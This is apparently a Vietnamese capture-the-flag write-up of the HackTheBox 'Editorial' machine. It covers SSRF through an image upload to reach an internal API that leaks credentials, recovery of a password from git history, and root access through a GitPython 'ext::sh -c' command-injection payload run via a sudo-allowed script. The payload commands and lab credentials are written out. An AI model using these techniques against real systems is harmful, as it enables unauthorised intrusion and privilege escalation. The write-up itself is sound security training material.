# Editorial

<img width="1440" height="668" alt="image" src="https://github.com/user-attachments/assets/3b417560-965c-45e9-9109-c5cd7640c6d0" />

Tôi dùng nmap quét thì ra được 2 cái port:
```
❯ sudo nmap -sV 10.10.11.20
[sudo] password for namdeptrai: 
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-13 14:54 +0700
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds
```
Truy cập vào địa chỉ ip thì dẫn đến website có đường dẫn `http://editorial.htb/` giao diện như này:

<img width="1845" height="876" alt="image" src="https://github.com/user-attachments/assets/1b84361e-9821-4c5e-8d0f-465cbdaa0891" />

Fuzz endpoint và subdomain thì không có gì đặc biệt, trong quá trình tìm kiếm thì có được `http://editorial.htb/upload`:

<img width="1626" height="880" alt="image" src="https://github.com/user-attachments/assets/8d4e52ac-b21c-4a12-9018-286163acb4b0" />

Ở đây thì chú ý đến upload ảnh, có 2 hình thức là chèn url ảnh vào hoặc upload ảnh:

<img width="1393" height="187" alt="image" src="https://github.com/user-attachments/assets/e62af2d6-ba1e-4fa8-8dfd-36c759d8ae86" />

Nếu để ý thì có 2 hình ảnh khác nhau là khi nhập đường link đúng, server có thể truy cập được thì hiển thị khác so với đường link không đúng hoặc nhập bừa gì đó 

<img width="1327" height="141" alt="image" src="https://github.com/user-attachments/assets/48de2269-3873-414b-bbde-067fd9ac65a3" />

<img width="1379" height="146" alt="image" src="https://github.com/user-attachments/assets/2b1c1152-02b2-42fd-9cf2-a0f64bf2ca64" />

Sử dụng wordlist `common-http-ports.txt` để brute port đang mở trên localhost của server và ra được port 5000:

<img width="1857" height="866" alt="image" src="https://github.com/user-attachments/assets/e4504484-2649-4bc1-9ccd-548697b67a6f" />

Ở đây thì xuất hiện 1 đống chỗ json để sử dụng api:

<img width="1493" height="763" alt="image" src="https://github.com/user-attachments/assets/2e4b5ed8-5d94-4c8a-b966-92a350f4101c" />

Nếu tiếp tục tìm thì sẽ xuất hiện `http://127.0.0.1:5000/api/latest/metadata/messages/authors` là có chứa các thông tin nhạy cảm:

<img width="1469" height="702" alt="image" src="https://github.com/user-attachments/assets/19fb0d32-835c-4f0b-a0fe-ae27c9422c54" />

Tôi mang cred `dev:dev080217_devAPI!@` đi đăng nhập vào ssh thì được:

<img width="1312" height="882" alt="image" src="https://github.com/user-attachments/assets/a4957dc0-2f8b-4ae3-9327-830c50cc547b" />

Sau khi truy cập vào thì tôi thấy có file `.git`, tôi check git log thì có khá nhiều thứ:
```
dev@editorial:~$ ls -la
total 36
drwxr-x--- 4 dev  dev  4096 Sep 12 09:00 .
drwxr-xr-x 4 root root 4096 Jun  5  2024 ..
drwxrwxr-x 3 dev  dev  4096 Jun  5  2024 apps
lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null
-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 dev  dev  3771 Jan  6  2022 .bashrc
drwx------ 2 dev  dev  4096 Jun  5  2024 .cache
-rw------- 1 dev  dev    20 Sep 12 09:00 .lesshst
-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile
-rw-r----- 1 root dev    33 Sep 12 07:22 user.txt
dev@editorial:~$ ls -la apps/
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
drwxr-x--- 4 dev dev 4096 Sep 12 09:00 ..
drwxr-xr-x 8 dev dev 4096 Jun  5  2024 .git
dev@editorial:~$ cd apps/
dev@editorial:~/apps$ ls
dev@editorial:~/apps$ git log
WARNING: terminal is not fully functional
Press RETURN to continue 
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
```
Check lịch sử ở `b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae` thì thấy có cred `prod:080217_Producti0n_2023!@` đã sửa thành `dev`:
```
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
WARNING: terminal is not fully functional
Press RETURN to continue 
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login crede
ntials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purpose
s.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login crede
ntials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nD
on't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
dev@editorial:~/apps$ cat /etc/passwd | grep "prod"
prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash
```
Khi check thì có tồn tại `prod` trong `/etc/passwd`, tôi thử ssh vào và thành công.

Tiếp tục tìm kiếm thì thấy có tồn tại `/opt/internal_apps/clone_changes/clone_prod_change.py` có thể chạy dưới quyền root bằng user `prod`:
```
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
Nếu để ý thì đoạn python này sử dụng thư viện `GitPython`:
```
prod@editorial:~$ pip show GitPython
Name: GitPython
Version: 3.1.29
Summary: GitPython is a python library used to interact with Git repositories
Home-page: https://github.com/gitpython-developers/GitPython
Author: Sebastian Thiel, Michael Trier
Author-email: byronimo@gmail.com, mtrier@gmail.com
License: BSD
Location: /usr/local/lib/python3.10/dist-packages
Requires: gitdb
Required-by: 
prod@editorial:~$ 
```
Bằng cách tra google thì tôi tìm được 1 lỗi dẫn đến RCE là [đây](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858):
```
from git import Repo
r = Repo.init('', bare=True)
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
```
Áp dụng vào trường hợp này:
```
prod@editorial:~$ pwd
/home/prod
prod@editorial:~$ ls
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /home/prod/abc.txt'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c touch% /home/prod/abc.txt new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:~$ ls -la
total 32
drwxr-x--- 5 prod prod 4096 Sep 13 08:29 .
drwxr-xr-x 4 root root 4096 Jun  5  2024 ..
-rw-r--r-- 1 root root    0 Sep 13 08:29 abc.txt
lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null
-rw-r--r-- 1 prod prod  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 prod prod 3771 Jan  6  2022 .bashrc
drwx------ 3 prod prod 4096 Jun  5  2024 .cache
drwxrwxr-x 4 prod prod 4096 Jun  5  2024 .local
-rw-r--r-- 1 prod prod  807 Jan  6  2022 .profile
drwx------ 2 prod prod 4096 Jun  5  2024 .ssh
```
Bằng cách này thì có thể thực thi các lệnh dưới quyền root => leo quyền thành công:
```
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt>/home/prod/abc.txt'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c cat% /root/root.txt>/home/prod/abc.txt new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:~$ cat abc.txt 
b06f4f875af902ad392b13a0f3fd622a
prod@editorial:~$ 
```
